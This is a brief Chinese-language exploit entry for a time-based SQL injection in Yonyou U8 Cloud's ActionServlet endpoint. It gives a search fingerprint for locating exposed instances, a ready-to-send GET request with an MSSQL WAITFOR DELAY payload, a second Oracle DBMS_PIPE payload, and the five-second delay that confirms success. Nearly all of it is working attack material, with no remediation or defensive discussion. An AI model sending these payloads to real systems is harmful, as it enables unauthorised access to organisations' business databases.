# 用友-U8C-Cloudcom-ufida-web-actionsql注入

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:5%27--&db_type=mssql HTTP/1.1`

**Payload**
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27%29%20AND%206358%3dDBMS_PIPE%2eRECEIVE_MESSAGE%28CHR%28105%29%7c%7cCHR%2888%29%7c%7cCHR%28104%29%7c%7cCHR%2883%29%2c5%29%20AND%20%28%27zMDX%27%3d%27zMDX&db_type=oracle HTTP/1.1
Host:
```
- **响应特征**：200 响应时间>=5s